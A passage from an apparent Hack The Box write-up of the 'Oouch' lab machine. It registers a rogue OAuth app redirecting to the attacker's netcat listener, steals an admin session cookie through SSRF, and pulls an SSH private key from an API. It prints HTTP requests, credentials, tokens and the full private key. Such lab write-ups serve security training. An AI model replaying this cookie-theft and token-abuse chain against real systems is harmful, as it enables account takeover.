listed:</p><blockquote><p>Hello qtc! You have currently following documents stored:</p><ul><li>dev_access.txt <strong>develop:supermegasecureklarabubu123!</strong> -&gt; Allows application registration.<li>o_auth_notes.txt /api/get_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.<li>todo.txt Chris mentioned all users could obtain my ssh key. Must be a joke…</ul></blockquote><p>I now had some credentials for a <code class="language-plaintext highlighter-rouge">develop</code> user but I wasn’t sure where to use them, other than they were good for registering an application.</p><p>I turned to gobuster once again to search for more directories, and found <code class="language-plaintext highlighter-rouge">/oauth/applications/register/</code> which gave me an HTTP basic authentication login prompt where I used the develop creds from the <code class="language-plaintext highlighter-rouge">/documents</code> page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/oouch17.png" alt="" /></p><p>After logging in I was given a page where I could register a new application. I went back and did some more research on registering web applications and found information for both Django and Flask.</p><blockquote><p><a href="https://django-registration.readthedocs.io/en/3.1/quickstart.html">https://django-registration.readthedocs.io/en/3.1/quickstart.html</a> - Programming information about registering Django apps</p></blockquote><blockquote><p><a href="https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html">https://flask-oauthlib.readthedocs.io/en/latest/oauth2.html</a> - how to register a new Flask application</p></blockquote><p>You can apparently set the authorization link to redirect wherever you want. By setting the redirect URL to be my local machine, I could then listen for a connection with netcat and see if it returned any interesting information.</p><p><em>I forgot the port on my redirect URL while filling out the request the first time. Luckily there was an edit button!</em></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/screenshot_2020-06-11_02-20-00.png" alt="" /></p><p>Side note: After creating an app and clicking “Go Back” it prompts for basic authentication with the text “Oouch Admin Only” at URL <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/oauth/applications/</code>. The <code class="language-plaintext highlighter-rouge">develop</code> creds did not work here.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/oouch20.png" alt="" /></p><p>My web app registration request looked like this in Burp:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/oauth/applications/register/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000/oauth/applications/register/</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">598</span>
<span class="na">Authorization</span><span class="p">:</span> <span class="s">Basic ZGV2ZWxvcDpzdXBlcm1lZ2FzZWN1cmVrbGFyYWJ1YnUxMjMh</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">csrftoken=qbyohMDkKGDo4c0PDr639MymQiqCyIv7tqPewPWOvY9QVzqOHH5q7L2w733HrfmA; sessionid=t8pysxzmxfaziblsj7bji2hz79kz7mry</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>

csrfmiddlewaretoken=8saMcdN6jW2HIJjcK33GCJ7TeAXljGnDvZbLYVRNgNzPSGJ1xWjjhYWRalMvov1A&amp;name=kaio&amp;client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&amp;initial-client_id=fN0PGweG94VEL6MzopplC1VASOetEWsVy3NW29ak&amp;client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&amp;initial-client_secret=sPtIDd40zXgsmk8QLZ6vqb0AfCsYAOXQE6XPF485RusVdMfUdqz5EZjRTurBLMRnn1LN5ACYNxarbiASALSMqAOhKIr3bvGzI5QDV5Pg2QAGmw83OyHJBbyDfidZDOti&amp;client_type=public&amp;authorization_grant_type=authorization-code&amp;redirect_uris=http%3A%2F%2F10.10.14.253%3A1234
</pre></table></code></div></div><p>After allowing the POST request with my credentials I was redirected to a GET request to the register page.</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/accounts/login/?next=/oauth/applications/register/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://authorization.oouch.htb:8000/oauth/applications/register/</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">csrftoken=qbyohMDkKGDo4c0PDr639MymQiqCyIv7tqPewPWOvY9QVzqOHH5q7L2w733HrfmA</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
</pre></table></code></div></div><p>I then sent an authorization request to the server to connect to the app I ‘created’, which I hoped would redirect to my netcat listener:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/oauth/authorize/?client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&amp;redirect_uris=http%3A%2F%2F10.10.14.253%3A1234&amp;grant_type=authorization-code&amp;client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">csrftoken=RE8nA0Evrg3xPQ2uEqOg4jEWdDSuktJXpc4tf1ugg4Ckf3MIsqGI7Yafq3W1eOS5; sessionid=veopt7hc8e8bv4jwl4ekv4ejlby8kxdn</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
</pre></table></code></div></div><p>I got a connection on my listener!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/oouch<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1234 <span class="o">&gt;</span> djangoapp                                                 
listening on <span class="o">[</span>any] 1234 ...                                                                            
connect to <span class="o">[</span>10.10.14.253] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.14.253] 53300
</pre></table></code></div></div><p>The connection only sent an error message, but it was enough to see that it worked how I wanted and gave me a clue as to what I needed to send to get a proper response.</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/?error=invalid_request&amp;error_description=Missing+response_type+parameter.</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.14.253:1234</span>
</pre></table></code></div></div><p>After seeing that I could get a connection from the server, I once again tried sending my request in a link to the admin on the <code class="language-plaintext highlighter-rouge">http://consumer.oouch.htb:5000/contact</code> page to see if we could use SSRF again to get any further info.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://authorization.oouch.htb:8000/oauth/authorize/?client_id<span class="o">=</span>aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&amp;redirect_uris<span class="o">=</span>http%3A%2F%2F10.10.14.253%3A1234&amp;grant_type<span class="o">=</span>authorization-code&amp;client_secret<span class="o">=</span>GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS
</pre></table></code></div></div><p>And I got a reply!</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/?error=invalid_request&amp;error_description=Missing+response_type+parameter.</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.14.253:1234</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">python-requests/2.21.0</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">keep-alive</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">sessionid=34w2oj9hyjofej6d4cwr9dykbm5dl9ex;</span>
</pre></table></code></div></div><p>I now had a session cookie from the admin. Since I was already logged in as <code class="language-plaintext highlighter-rouge">qtc</code> on the consumer portal, I used this cookie to see if I could to log into <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/</code> as <code class="language-plaintext highlighter-rouge">qtc</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/screenshot_2020-06-11_02-51-40.png" alt="" /></p><p>It worked! Now that I had a higher privilege oauth2 account, I decided it was time to try out those endpoint links to get an authorization token from <code class="language-plaintext highlighter-rouge">/oauth/token</code> to access the API <code class="language-plaintext highlighter-rouge">/oauth/get_user</code> I saw earlier.</p><p>Next I did some more oauth2 research, in particular on authenticating to APIs:</p><blockquote><ul><li><a href="https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end">https://www.toptal.com/django/integrate-oauth-2-into-django-drf-back-end</a><li><p><a href="https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm">https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm</a></p><p>I found out that the grant type must be <code class="language-plaintext highlighter-rouge">client_credentials</code></p><li><p><a href="https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/">https://www.oauth.com/oauth2-servers/access-tokens/client-credentials/</a></p><p>and the request must also include <code class="language-plaintext highlighter-rouge">client_id</code> and <code class="language-plaintext highlighter-rouge">client_secret</code>.</p></ul></blockquote><p>My first attempts failed:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/oauth/token/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">227</span>
<span class="na">Content-type</span><span class="p">:</span><span class="s">application/x-www-form-urlencoded</span>

grant_type=client_credentials&amp;
client_id=aIX617P5jWh41UJ1Li3xntUi3W1xVOZDPb0YupTG&amp;
client_secret=GaUjTTAVrdAJPQHlp3B5NwpR0KvBSSvM6cIopY4uYmZ5N77toqYTidg5CMsW0CMpaWRuBP2YmjNcM9fZD0cJbEIqPyJrWn6Y8RcRD8E2w8C9MuZpjiDhvkRVr9Du97DS
</pre></table></code></div></div><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">401</span> <span class="ne">Unauthorized</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">WWW-Authenticate</span><span class="p">:</span> <span class="s">Bearer, error="invalid_client"</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">27</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Authorization</span>

<span class="p">{</span><span class="nl">"error"</span><span class="p">:</span><span class="w"> </span><span class="s2">"invalid_client"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>I kept getting <code class="language-plaintext highlighter-rouge">"invalid_grant_type"</code> and <code class="language-plaintext highlighter-rouge">"invalid_client"</code> errors, until I did some more reading and found out that the the request cannot have newlines in it! <a href="https://stackoverflow.com/questions/29360349/getting-error-unsupported-grant-type-when-trying-to-get-a-jwt-by-calling-an">https://stackoverflow.com/questions/29360349/getting-error-unsupported-grant-type-when-trying-to-get-a-jwt-by-calling-an</a></p><p>My next attempt went better:</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/oauth/token/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
<span class="na">Content-type</span><span class="p">:</span><span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">223</span>

grant_type=client_credentials&amp;client_id=BINNWck8w5CElXxFcUp4hWlbbnJ9YSRautJ2WNjh&amp;client_secret=MGOEEB0A2EptkpF35uYoJOwVgBQDISm2RQAzojkGK4N3whYaSiAl3mjf7EoPyjteCGoJbuiMCSNI1OhxzjEpETFNoUSHvIaMsIUVEos1KKumTFlZ3obeZYhMYthZKVIz
</pre></table></code></div></div><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">116</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Authorization</span>

<span class="p">{</span><span class="nl">"access_token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"A8lhuPCNBxtMZwFJ9vgpdh1ntW94zg"</span><span class="p">,</span><span class="w"> </span><span class="nl">"expires_in"</span><span class="p">:</span><span class="w"> </span><span class="mi">600</span><span class="p">,</span><span class="w"> </span><span class="nl">"token_type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bearer"</span><span class="p">,</span><span class="w"> </span><span class="nl">"scope"</span><span class="p">:</span><span class="w"> </span><span class="s2">"read write"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><h3 id="finding-user-creds">Finding user creds</h3><p>I got the access token! I then tried to use the token to get info from the <code class="language-plaintext highlighter-rouge">/oauth/get_user</code> API, but got back nothing useful. After playing around with it, I thought back to the the note on qtc’s <code class="language-plaintext highlighter-rouge">/documents</code> page that mentioned easy user access to the SSH key and substituted <code class="language-plaintext highlighter-rouge">get_user</code> with <code class="language-plaintext highlighter-rouge">get_ssh</code>.</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/api/get_ssh/?access_token=A8lhuPCNBxtMZwFJ9vgpdh1ntW94zg</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">authorization.oouch.htb:8000</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">csrftoken=RE8nA0Evrg3xPQ2uEqOg4jEWdDSuktJXpc4tf1ugg4Ckf3MIsqGI7Yafq3W1eOS5; sessionid=34w2oj9hyjofej6d4cwr9dykbm5dl9ex;</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">DNT</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
</pre></table></code></div></div><p>I got an SSH key for the user <code class="language-plaintext highlighter-rouge">qtc</code>! Annoyingly, it was on a single line and had a lot of <code class="language-plaintext highlighter-rouge">\n</code> characters in it that had to be fixed.</p><div class="language-http highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">SAMEORIGIN</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">2708</span>
<span class="na">Vary</span><span class="p">:</span> <span class="s">Authorization, Cookie</span>

{"ssh_server": "consumer.oouch.htb", "ssh_user": "qtc", "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"}
</pre></table></code></div></div><p>The next step was to use SSH to login to the machine. The command <code class="language-plaintext highlighter-rouge">ssh -i &lt;private_key_file&gt;</code> __lets you use a private key to login.</p><blockquote><p>Note: Don’t forget to<strong><code class="language-plaintext highlighter-rouge">chmod 600</code></strong> your SSH keys before use!</p></blockquote><h3 id="usertxt">User.txt</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/oouch<span class="nv">$ </span><span class="nb">chmod </span>600 qtc.id_rsa
zweilos@kalimaa:~/htb/oouch<span class="err">$</span>
zweilos@kalimaa:~/htb/oouch<span class="nv">$ </span>ssh qtc@10.10.10.177 <span class="nt">-i</span> qtc.id_rsa

Linux oouch 4.19.0-8-amd64 <span class="c">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the 
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent 
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3

qtc@oouch:~<span class="nv">$ </span><span class="nb">whoami</span> <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span>qtc
oouch
qtc@oouch:~<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux oouch 4.19.0-8-amd64 <span class="c">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux</span>

qtc@oouch:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
6c92fdd3954c49f4c3e0e76d95d0cd2b

qtc@oouch:~<span class="nv">$ </span><span class="nb">cat</span> .note.txt 
Implementing an IPS using DBus and iptables <span class="o">==</span> Genius?
</pre></table></code></div></div><p>I got the <code class="language-plaintext highlighter-rouge">user.txt</code>! There was also a hidden file named <code class="language-plaintext highlighter-rouge">.note.txt</code> that mentioned using <code class="language-plaintext highlighter-rouge">DBus</code> and <code class="language-plaintext highlighter-rouge">iptables</code> to implement an IPS.</p><h2 id="path-to-power-gaining-administrator-access">Path to Power (Gaining Administrator Access)</h2><h3 id="enumeration-as-user---qtc">Enumeration as user - <code class="language-plaintext highlighter-rouge">qtc</code></h3><p>While enumerating I found a configuration file named <code class="language-plaintext highlighter-rouge">htb.oouch.Block.conf</code> in the Dbus configuration files. I figured this must be related to that hidden note I found about an IPS using Dbus.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>qtc@oouch:/etc/dbus-1/system.d<span class="nv">$ </span><span class="nb">ls
</span>bluetooth.conf                      htb.oouch.Block.conf             wpa_supplicant.conf
com.ubuntu.SoftwareProperties.conf  org.freedesktop.PackageKit.conf

qtc@oouch:/etc/dbus-1/system.d<span class="nv">$ </span><span class="nb">cat </span>htb.oouch.Block.conf
</pre></table></code></div></div><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
